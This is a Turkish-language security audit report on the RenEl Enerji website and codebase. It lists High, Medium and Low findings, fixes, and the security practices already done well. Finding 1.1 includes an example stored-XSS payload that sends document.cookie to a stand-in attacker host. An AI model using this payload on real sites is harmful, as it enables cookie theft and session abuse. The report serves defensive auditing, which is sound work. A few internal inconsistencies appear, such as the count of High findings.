# RenEl Enerji — Güvenlik ve Sızma Testi Raporu

**Tarih:** 2026-08-01
**Kapsam:** Tüm kod tabanı (backend/NestJS, frontend/React, CI/CD, deploy config) statik güvenlik incelemesi + `renelenerji.com` canlı sitesinde pasif/salt-okunur (non-destructive) kontroller.
**Kapsam DIŞI:** Aktif exploit denemesi, brute-force, fuzzing, DoS, VPS'e doğrudan erişim (bu makineden VPS'e SSH yok).

---

## Yönetici Özeti

Genel tablo **iyi**. Proje, boyutuna göre alışılmadık derecede özenli bir güvenlik mimarisine sahip: şifreli TOTP sırları, doğru JWT/cookie ayarları, parametrize SQL sorguları, tutarlı rate limiting, sıkı CORS allow-list, iyi yapılandırılmış CSP/HSTS. Kritik (acil müdahale gerektiren, doğrudan sömürülebilir) bir açık **bulunmadı**.

Bulunan tek **Yüksek (High)** öncelikli kod açığı, JSON-LD SEO verisine kaçışsız (unescaped) veri basılması nedeniyle oluşan bir **stored XSS** potansiyeli — bunun dışındaki bulgular Orta/Düşük seviyede, çoğunlukla "iyi olur" türünden sertleştirme (hardening) önerileri.

| Öncelik | Sayı |
|---|---|
| Kritik | 0 |
| Yüksek | 3 |
| Orta | 7 |
| Düşük | 10 |
| Bilgi / Olumlu | 25+ |

---

## 1. YÜKSEK ÖNCELİKLİ BULGULAR

### 1.1 — JSON-LD içine kaçışsız veri basılması → Stored XSS riski
**Dosya:** `frontend/src/components/SEO.jsx:47`
```jsx
{jsonLd && (
  <script type="application/ld+json">{JSON.stringify(jsonLd)}</script>
)}
```
`react-helmet-async`, script içeriğini `innerHTML` üzerinden yerleştiriyor (kütüphanenin kendi kaynak kodunda doğrulandı). `JSON.stringify()` `<`, `>` karakterlerini kaçışlamaz. Bu değer şu sayfalarda admin/Instagram kaynaklı dinamik verilerle besleniyor:
- `frontend/src/pages/BlogDetay.jsx:38-56` (blog başlığı/özeti — admin panelden giriliyor)
- `frontend/src/pages/projeler/ProjeDetay.jsx:63-79` (proje adı/açıklaması — **Instagram caption senkronizasyonundan otomatik doldurulabiliyor**, bkz. `frontend/src/api/admin.ts:112-127`)

**Saldırı senaryosu:** Bağlı Instagram hesabına (veya admin paneline) `</script><img src=x onerror="fetch('//evil.tld/c?c='+document.cookie)">` içeren bir caption/başlık girildiğinde, bu değer JSON-LD script'ini erken kapatıp enjekte edilen `<img onerror>` etiketinin çalışmasına yol açar. Siteyi ziyaret eden **her kullanıcının** tarayıcısında JS çalışır. Admin cookie'si `httpOnly` olduğu için doğrudan çalınamaz, ama ziyaretçi tarafında session/analytics manipülasyonu, phishing yönlendirmesi, kimlik avı formu enjeksiyonu gibi klasik XSS sonuçları mümkündür.

**Düzeltme:** `SEO.jsx` içinde tek noktadan kaçışlama:
```js
JSON.stringify(jsonLd).replace(/</g, '\\u003c')
```
(Ek güvenlik için `>` ve `&` karakterleri de kaçışlanabilir.)

### 1.2 — `sharp` (libvips) yüksek şiddetli CVE'ler — backend
`npm audit` (backend): `sharp <0.35.0` → CVE-2026-33327/33328/35590/35591 (libvips kaynaklı). Görsel işleme (upload pipeline'da her yüklenen resmi WEBP'ye çeviriyor) bu paketten geçtiği için, kötü amaçlı bir görsel dosyasıyla tetiklenebilecek bellek bozulması sınıfı açıklar. `npm audit fix --force` ile `sharp@0.35.3`'e geçiş breaking change içeriyor — test edip planlı şekilde yükseltilmeli.

### 1.3 — Docker imajlarında sabitlenmemiş (`:latest`) etiketler
`docker-compose.yml:82` (`tvanro/prerender-alpine:latest`) ve `:124` (`ghcr.io/umami-software/umami:postgresql-latest`). Bu imajlar tekrar pull edildiğinde (yeni VPS kurulumu, manuel `docker compose pull`) gözden geçirilmemiş kod backend/db/redis ile aynı Docker ağında çalışır hale gelir — tedarik zinciri (supply-chain) riski. Belirli bir sürüme veya `@sha256:` digest'ine sabitlenmeli.

---

## 2. ORTA ÖNCELİKLİ BULGULAR

### 2.1 — `/api` yönlendirmesi iç port numarasını cleartext HTTP ile sızdırıyor *(canlı site)*
`https://renelenerji.com/api` isteği `Location: http://renelenerji.com:8080/api/` döndürüyor — hem **iç mimari bilgisi** (8080 portu, muhtemelen reverse-proxy/nginx server_port değişkeni doğru ayarlanmamış) hem de **protokol düşürme** (https→http) sızdırıyor. Doğrulandı: port 8080 dışarıdan doğrudan erişilebilir değil (Cloudflare proxy'lemiyor, timeout), yani şu an doğrudan sömürülebilir değil — ama bir yapılandırma hatası veya firewall değişikliği bu portu açığa çıkarırsa, o an bu redirect zincirini takip eden istemciler düz metin HTTP'ye düşer. Nginx/reverse-proxy config'inde `$server_port` yerine sabit `443`/`$scheme` kullanılmalı ve iç port harici Location header'larına hiç yansıtılmamalı.

### 2.2 — DMARC kaydı yok *(DNS, canlı ortam)*
`_dmarc.renelenerji.com` için TXT kaydı bulunamadı. SPF kaydı var ama `~all` (softfail, hardfail değil). Bu, `@renelenerji.com` adresinden sahte e-posta gönderimini (iş ortaklarına/müşterilere yönelik oltalama) alıcı sunucuların güvenilir biçimde reddetmesini/karantinaya almasını engelliyor.
**Düzeltme:** En az `p=quarantine` ile bir DMARC kaydı eklenmesi, SPF'in zamanla `-all`'a geçirilmesi.

### 2.3 — `/api/health` uç noktası kimlik doğrulamasız ve hata detayını dışarı sızdırıyor
`backend/src/health.controller.ts:32-40` — Redis/DB erişilemezse ham sürücü hata mesajı (host/port/bağlantı detayları içerebilir) kimlik doğrulamasız çağrılara JSON olarak dönüyor. Genel `{status:'down'}` yanıtı yeterli; detay yalnızca sunucu taraflı loglanmalı (zaten Sentry/DbLogger'a düşüyor).

### 2.4 — Sentry'de `sendDefaultPii` açıkça kapatılmamış
`backend/src/instrument.ts:3-9`. SDK varsayılanı güvenli olsa da (`false`), gelecekte bir `Logger.error(req)` hatasıyla cookie/authorization header'ının Sentry'ye (üçüncü taraf servis) sızma riskine karşı açıkça `sendDefaultPii: false` ayarlanmalı ve bir `beforeSend` redaksiyon hook'u eklenmeli.

### 2.5 — Docker build context'lerinde `.dockerignore` yok
`backend/Dockerfile` ve `frontend/Dockerfile` `COPY . .` yapıyor, `.dockerignore` hiçbiri için mevcut değil. Yerelde `backend/.env`/`frontend/.env` gibi dosyalar build anında mevcutsa, builder katmanına (final image'a değil ama Docker layer cache'ine) kopyalanabilir ve VPS'te Docker erişimi olan biri tarafından çıkarılabilir.

### 2.6 — GitHub Actions üçüncü taraf action'lar SHA'ya değil tag'e sabitlenmiş
`.github/workflows/deploy.yml` — `actions/checkout@v4`, `actions/setup-node@v4`, `appleboy/ssh-action@v1.2.0`. Tag'ler mutable; bakımcı hesabı ele geçirilirse, `VPS_SSH_KEY` secret'ına erişimi olan bir workflow'da kötü amaçlı kod çalışabilir. Commit SHA'sına sabitlenmesi önerilir.

### 2.7 — `deploy.yml` içinde `permissions:` bloğu yok
`GITHUB_TOKEN` repo/org varsayılanını (genelde gereğinden geniş) alıyor. `permissions: { contents: read }` eklenmeli — bu workflow yazma iznine hiç ihtiyaç duymuyor.

---

## 3. DÜŞÜK ÖNCELİKLİ BULGULAR

| # | Bulgu | Konum |
|---|---|---|
| 3.1 | `react-router-dom` CSRF-bypass CVE'si (GHSA-qwww-vcr4-c8h2) mevcut ama kodun kullanım şekli (plain `BrowserRouter`, RSC/server actions yok) nedeniyle şu an sömürülemez; yine de yükseltilmeli | frontend npm audit |
| 3.2 | `dompurify` CVE'si (CUSTOM_ELEMENT_HANDLING bypass) mevcut ama kod hiç config vermeden `sanitize()` çağırıyor, bypass tetiklenmiyor; yükseltme önerilir | frontend npm audit |
| 3.3 | `typeorm <0.3.31` migration template-literal code injection (orta şiddet, migration üretimi geliştirici ortamında çalışıyor, prod saldırı yüzeyi değil) | backend npm audit |
| 3.4 | `brace-expansion` DoS (typeorm'un transitive bağımlılığı, `npm audit fix` ile otomatik düzelir) | backend npm audit |
| 3.5 | DOMPurify varsayılan profille (allowlist belirtilmeden) çağrılıyor — tek `dangerouslySetInnerHTML` kullanımı | `frontend/src/pages/BlogDetay.jsx:94` |
| 3.6 | Login brute-force koruması yalnızca IP bazlı (5/dk) — dağıtık saldırıya karşı ek katman yok (bcrypt cost 12 + TOTP arkasında olduğu için risk sınırlı) | `backend/src/auth/auth.controller.ts:43` |
| 3.7 | Chat `sessionId` sunucu tarafında IP/cookie'ye bağlanmamış, salt client UUID | `backend/src/chat/chat-history.service.ts` |
| 3.8 | Admin `:id` route parametreleri `ParseUUIDPipe` ile doğrulanmıyor (geçersiz UUID → 500 yerine 400 dönmeli, bilgi sızıntısı yok ama log gürültüsü var) | `faq/faq.controller.ts`, `references/references.controller.ts` vb. |
| 3.9 | Instagram medya indirme akışında host allow-list yok — bugün sömürülemez (Meta imzalı webhook + kendi hesabınız), ama IG hesabı/token'ı ele geçirilirse SSRF primitive'ine dönüşür | `backend/src/projects/instagram-import.service.ts:230-263` |
| 3.10 | Yedekleme dosyaları (`backup-db.sh`) varsayılan umask ile oluşuyor — VPS'te başka bir yerel hesap olursa DB dump'ı okunabilir olabilir | `scripts/backup-db.sh` |

Ayrıca canlı sitede: **çakışan/tekrarlı güvenlik header'ları** (`x-frame-options` hem `SAMEORIGIN` hem `DENY`, iki farklı `content-security-policy`, iki `referrer-policy` — muhtemelen hem uygulama/helmet katmanı hem başka bir proxy katmanı aynı header'ları ayrı ayrı ekliyor). Fonksiyonel olarak zarar vermiyor (tarayıcılar en kısıtlayıcıyı uygular) ama yapılandırma karmaşasına işaret ediyor, birleştirilmesi önerilir. CAA DNS kaydı da yok (herhangi bir CA sertifika verebilir — düşük risk).

---

## 4. DOĞRULANMIŞ / ÇÜRÜTÜLMÜŞ ŞÜPHELİ BULGULAR

- **CSRF (upload endpoint'leri, frontend ajanı tarafından "orta" olarak işaretlenmişti):** Backend'de `auth.controller.ts:30,39` `sameSite: 'strict'` kullanıyor — bu, cookie'nin **hiçbir** cross-site isteğe (form submit dahil) eklenmemesini garanti eder. Bulgu bu nedenle **kapalı/etkisiz** kabul edildi, ek aksiyon gerekmiyor.
- **Path traversal / hassas dosya sızıntısı şüphesi (`/.env`, `/.git/config`, `/docker-compose.yml` vb. canlı sitede `200 OK` dönmesi):** İçerik kontrolü yapıldı — hepsi SPA fallback'i (`index.html`) döndürüyor, gerçek dosya sızıntısı **yok**. React Router'ın istemci taraflı yönlendirmesi nedeniyle her path 200 dönüyor, bu normal SPA davranışı.
- **CORS yanlış yapılandırması şüphesi:** `Origin: https://evil-attacker.example` ile test edildi — `Access-Control-Allow-Origin` header'ı **dönmüyor** (tarayıcı bloklar); meşru origin ile test edildiğinde doğru şekilde yansıtılıyor. CORS **doğru yapılandırılmış**, bulgu değil.

---

## 5. GÜÇLÜ YÖNLER (yapılan doğru şeyler)

**Backend:**
- TOTP sırları AES-256-GCM ile şifreli saklanıyor, rastgele IV, zorunlu 64-hex `APP_ENCRYPTION_KEY` (Joi ile boot-time doğrulama)
- JWT: httpOnly + secure + `sameSite: strict` cookie, Redis tabanlı `jti` blacklist (logout), `tokenVersion` ile şifre değişiminde tüm oturumların iptali
- bcrypt cost 12, kullanıcı adı yanlış olsa bile `bcrypt.compare` her zaman çalıştırılıyor (timing-attack ile kullanıcı adı keşfi engelleniyor)
- TOTP replay koruması: her kod kullanımdan sonra Redis'te 60sn yakılıyor
- Webhook imza doğrulaması `timingSafeEqual` ile yapılıyor
- Upload pipeline: sunucu taraflı dosya adları, SVG tamamen reddediliyor, magic-byte doğrulama, tüm görseller WEBP'ye çevriliyor, başarısız yüklemelerde temp dosya temizliği, haftalık orphan-file cron'u
- Ham SQL yok denecek kadar az, olan tek yer tamamen parametrize
- `sanitize-html` (backend) + `DOMPurify` (frontend) ile blog içeriğinde çift katmanlı XSS koruması
- CORS gerçek bir allow-list (`*` değil), rate limiting hem global hem endpoint bazlı katmanlı (login 5/dk, 2FA 10/dk, chat 20/dk)
- Chatbot prompt-injection filtreleri + LLM-judge ikinci geçiş
- KVKK uyumlu veri saklama: sohbet dökümleri 6 ay, loglar 30 gün sonra otomatik temizleniyor
- `ValidationPipe({whitelist:true, forbidNonWhitelisted:true})` ile mass-assignment koruması
- Container non-root kullanıcıyla çalışıyor, multi-stage build ile devDependencies final image'da yok
- Kod içinde hiçbir hardcoded secret bulunamadı

**Frontend:**
- Admin JWT hiçbir zaman JS'e dokunmuyor (httpOnly cookie üzerinden `credentials:'include'`), localStorage'da sadece kullanıcı adı (UX için) tutuluyor
- Route guard'lar auth kontrolü tamamlanmadan hiçbir korumalı sayfa/veri render etmiyor
- tiptap link eklentisi `javascript:` gibi tehlikeli URL şemalarını bağımsızca reddediyor (DOMPurify'a ek savunma katmanı)
- Tüm `target="_blank"` linklerde `rel="noopener noreferrer"` var
- Açık yönlendirme (open redirect) yok
- Bundle içinde hardcoded secret yok

**Canlı site (Cloudflare + nginx):**
- Güçlü CSP, HSTS (preload dahil), X-Frame-Options DENY, COOP, Permissions-Policy
- TLS 1.2/1.3 destekleniyor, geçerli sertifika (Google Trust Services)
- CORS doğru allow-list, kimlik bilgisi (credentials) olan isteklerde origin yansıtması yok
- `/admin` robots.txt'te disallow edilmiş
- Rate limiting API katmanında aktif (60 istek/dk)

**CI/CD:**
- Deploy workflow yalnızca `push: main` ile tetikleniyor (fork PR saldırı vektörü yok)
- Prod secret'ları (DB_PASS, JWT_SECRET vb.) hiç GitHub Actions'tan geçmiyor, sadece VPS'teki `.env`'de
- SSH anahtarı `appleboy/ssh-action` ile güvenli işleniyor, hiçbir `run:` adımında secret echo edilmiyor
- Deploy, testler geçmeden tetiklenmiyor (`needs: test`)
- `db`/`redis` container'larının host'a açık portu yok, `backend` sadece `expose` kullanıyor
- `backup-db.sh`: `set -euo pipefail`, tüm değişkenler quote'lu, DB parolası `ps aux`'ta görünmüyor (docker exec + socket üzerinden)

---

## 6. ÖNCELİKLİ AKSİYON LİSTESİ

1. **[Yüksek]** `SEO.jsx`'te JSON-LD çıktısını kaçışla (`<` → `<`) — tek satırlık düzeltme, tüm sayfaları kapsar.
2. **[Yüksek]** `sharp`'ı `0.35.3`'e yükselt (breaking change — test planı gerekli).
3. **[Yüksek]** Docker Compose'daki `:latest` etiketlerini (prerender, umami) sabit sürüme/digest'e bağla.
4. **[Orta]** Nginx/reverse-proxy'de `/api` yönlendirmesinin iç port (8080) ve http şemasını sızdırmasını düzelt.
5. **[Orta]** DMARC kaydı ekle (`p=quarantine` ile başla), SPF'i zamanla `-all`'a çevir.
6. **[Orta]** `/api/health` yanıtındaki ham hata mesajını kaldır, genel `{status:'down'}` dön.
7. **[Orta]** `backend/.dockerignore` ve `frontend/.dockerignore` ekle (`.env*`, `node_modules`, `.git`).
8. **[Orta]** Sentry'de `sendDefaultPii: false` açıkça ayarla.
9. **[Orta]** GH Actions'ları commit SHA'sına sabitle, `deploy.yml`'e `permissions: {contents: read}` ekle.
10. **[Düşük]** Kalan npm audit kalemlerini (`react-router`, `dompurify`, `typeorm`, `brace-expansion`) plan dahilinde güncelle.
11. **[Düşük]** DOMPurify'a açık `ALLOWED_TAGS`/`ALLOWED_ATTR` config ver.
12. **[Düşük]** Instagram medya indirmede host allow-list (`*.fbcdn.net`, `*.cdninstagram.com`) ekle.
13. **[Düşük]** Duplicate güvenlik header'larını (helmet vs proxy katmanı) tek kaynağa indir.
14. **[Düşük]** `backup-db.sh`'a `umask 077` ekle; Redis healthcheck'te `-a` yerine `REDISCLI_AUTH` kullan.

---

*Bu rapor statik kod incelemesi ve canlı sitede yalnızca pasif/salt-okunur (GET, header, DNS, TLS handshake) kontrollere dayanmaktadır. Aktif exploit denemesi, brute-force veya DoS testi yapılmamıştır.*
